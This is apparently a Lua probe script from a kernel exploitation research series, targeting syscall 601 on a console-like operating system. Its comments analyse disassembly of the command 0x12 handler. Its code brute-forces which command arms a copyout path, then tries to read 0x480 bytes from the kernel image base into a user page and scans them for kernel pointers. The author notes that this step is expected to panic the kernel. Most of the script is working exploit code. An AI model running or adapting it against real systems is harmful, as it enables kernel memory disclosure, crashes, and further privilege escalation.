-- CRASH_CLASS: RISKY (section [D] can panic the kernel; it is last)
-- PROBE 1357a: sys 601 cmd 0x12 - the EFAULT was a struct-content gate
--
-- Context: 1356a (results/phase35_dead_end_reruns/1356a_sys601_eno_20261109_110852.txt)
-- measured cmd 0x12 returning -1/EFAULT(14) for a mapped, an unmapped and a
-- null arg2 alike, and EINVAL(22) when arg1 was nonzero. That read like "the
-- copyin source is rejected", but the body says otherwise.
--
-- results/kernel_handlers/asm/sys_601_deep.asm:626-646 (block ca1032, the 0x12
-- family) is:
--     copyin(src = arg2, dst = [rbp-0xf0], len = 0x18)
--     if (error) return error
--     if ([rbp-0xe8] == 0) return 0xe          <-- EFAULT(14), our measurement
--     lock proc+0x148
--     if ([td+0x528] & 0x400) -> consumer
--     else unlock, return 2
-- [rbp-0xe8] is qword 1 of the copied struct, so a ZERO qword 1 is what
-- produced 14. Our probes passed a zeroed buffer, so the command was never
-- actually tested: it answered its own argument check.
--
-- The consumer (sys_601_deep.asm:1253-1277, reached only with bit 0x400 set)
-- does copyout(dst = [td+0x578], src = [rbp-0xe8] = qword 1 of THIS call,
-- len = 0x480) and then kfree([td+0x578]). So the family is a kernel read
-- whose source is the argument, whose destination was stored by an earlier
-- call, and whose teardown frees that destination.
--
-- [A] control: 601(0) is the state query.
-- [B] 0x12 with {0, 1}: qword 1 nonzero, destination 0. If the answer moves
--     off 14 the gate is confirmed; with bit 0x400 clear the body should
--     return 2, and with it set the consumer skips (qword 0 == 0) and returns
--     without doing anything, so this shape is safe either way.
-- [C] the panic-free oracle: for every candidate command, call cmd {0,1} then
--     call 0x12 {0,1} again. The command that flips 0x12's answer from 2 to
--     something else is the one that sets bit 0x400 (and, per block ca0de6,
--     the one that stores {qword0, qword1} into td+0x578/+0x580).
-- [D] last, may panic: store destination = a mapped user page, then call 0x12
--     with qword 1 = the 14.10 kernel image base (STATE.md, this boot). The
--     consumer then copyout's 0x480 kernel bytes to our page and kfree()s it;
--     the kfree of a user address is expected to panic, which is why this runs
--     after everything that can be printed. If the console survives, the page
--     holds a kernel read and the scan below reports the first kernel-shaped
--     qwords.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1355a_sys601_cmd12_shape_20261109_110324.txt
--   results/phase35_dead_end_reruns/1356a_sys601_eno_20261109_110852.txt
--   results/kernel_handlers/asm/sys_601_deep.asm:478-520 (store block ca0de6)
--   results/kernel_handlers/asm/sys_601_deep.asm:626-646 (block ca1032, the gate)
--   results/kernel_handlers/asm/sys_601_deep.asm:1253-1277 (the consumer)
--   results/kernel_handlers/analysis/sys_601_deep.md:28,72-79

print("=== PROBE 1357a: SYS 601 CMD 0x12 GATE ===")

local KERNEL_BASE = 0xFFFFFFFFC1000000  -- STATE.md, 2026-11-09 10:05 UTC boot

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function hx(v)
    if v == nil then return "nil" end
    return string.format("0x%08X", v % 0x100000000)
end
local function sgn(val)
    local ok, h, l = pcall(function() return val.h, val.l end)
    if ok and type(h) == "number" and type(l) == "number" then
        local lo = l % 0x100000000
        if lo == 0xFFFFFFFF and (h % 0x100000000) == 0xFFFFFFFF then return "-1" end
        return string.format("0x%X_%08X", h % 0x100000000, lo)
    end
    if type(val) == "number" then
        if val < 0 then return tostring(val) end
        return string.format("0x%X", val)
    end
    return tostring(val)
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function u64v(v) return uint64(string.format("0x%X", v)) end

local sc601 = make_syscall(601)
local sc477 = make_syscall(477)
local getpid = make_syscall(20)

print(string.format("[0] pid=%d", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

-- one RW page for the struct, one for the destination
local function mmap_page()
    local a = to_num(sc477(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if a ~= 0 and a < 0x800000000000 then
        for o = 0, 0x3FFC, 4 do safe_wd(a + o, 0) end
    end
    return a
end

local S = mmap_page()
local D = mmap_page()
print(string.format("  struct=0x%X dest=0x%X", S, D))
if S == 0 or D == 0 then print("[!] mmap failed"); return end

-- struct: qword0 = destination, qword1 = source, qword2 = filler
local function set_struct(q0, q1)
    for i = 0, 7 do safe_wd(S + i * 4, 0) end
    safe_wq(S + 0, u64v(q0))
    safe_wq(S + 8, u64v(q1))
    safe_wq(S + 16, u64v(0))
end
local function call(cmd, a1, a2)
    local ok, ret = pcall(function() return sc601(uint64(cmd), uint64(a1), uint64(a2)) end)
    return (ok and sgn(ret) or "PCALL-FAIL"), es()
end
local function paint(v)
    for i = 0, 0xFFF do safe_wd(D + i * 4, v) end
end
local function changed()
    local n = 0
    for i = 0, 0xFFF do
        if safe_rd(D + i * 4) ~= 0xA5A5A5A5 then n = n + 1 end
    end
    return n
end

print("")
print("[A] control")
set_struct(0, 0)
print(string.format("  0x00 (0, 0) : %s  errno=%s", call(0x00, 0, S)))

print("")
print("[B] cmd 0x12 with qword1 != 0")
set_struct(0, 1)
print(string.format("  0x12 {0, 1}      : %s  errno=%s", call(0x12, 0, S)))
set_struct(0, 0)
print(string.format("  0x12 {0, 0}      : %s  errno=%s  (expected errno 14)", call(0x12, 0, S)))
set_struct(0x1000, 1)
print(string.format("  0x12 {0x1000, 1}: %s  errno=%s", call(0x12, 0, S)))

print("")
print("[C] which command sets bit 0x400 / stores into td+0x578?")
print("    baseline 0x12 {0,1}, then <cmd> {0,1}, then 0x12 {0,1} again")
local cmds = {0x05, 0x10, 0x11, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,
              0x1a, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x26}
local setter = nil
for _, cmd in ipairs(cmds) do
    set_struct(0, 1)
    local base, be = call(0x12, 0, S)
    local r, e = call(cmd, 0, S)
    set_struct(0, 1)
    local after, ae = call(0x12, 0, S)
    local mark = ""
    if after ~= base then mark = "   <<< CHANGED"; setter = cmd end
    print(string.format("  cmd 0x%02X -> %-12s (0x12 before %-12s after %-12s)%s",
        cmd, r, base, after, mark))
    if after ~= base then break end
end
if setter then
    print(string.format("  setter = 0x%02X", setter))
else
    print("  no command flipped 0x12's answer in this list")
end

print("")
print("[D] LAST, may panic: store dest=D through the setter, then 0x12 with source = kernel base")
print("    consumer = copyout(D <- kernel base, 0x480) then kfree(D)")
if setter == nil then
    print("  skipped: no setter identified, td+0x578 would stay 0 and the consumer would skip")
else
    paint(0xA5A5A5A5)
    set_struct(D, 0)
    print(string.format("  store call 0x%02X {D, 0} : %s  errno=%s", setter, call(setter, 0, S)))
    set_struct(D, KERNEL_BASE)
    print(string.format("  read  call 0x12 {D, KVA}: %s  errno=%s", call(0x12, 0, S)))
end
local n = changed()
print(string.format("  dest changed dwords = %d of 4096", n))
local hits = 0
for i = 0, 0xFFF do
    local a = D + i * 4
    local ok, q = pcall(function() return memory.read_qword(a) end)
    if ok and q ~= nil then
        local h = 0
        local okh, hh = pcall(function() return q.h end)
        if okh and type(hh) == "number" then h = hh % 0x100000000 end
        if h >= 0xFFFF8000 then
            print(string.format("  kptr @ +0x%03X = 0x%X_%08X", i * 4, h, to_num(q.l)))
            hits = hits + 1
            if hits >= 8 then break end
        end
    end
end
if hits == 0 then print("  no kernel-shaped qword in the first 0x1000 bytes") end

print("")
print(string.format("[Z] alive pid=%d", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
print("=== PROBE 1357a COMPLETE ===")
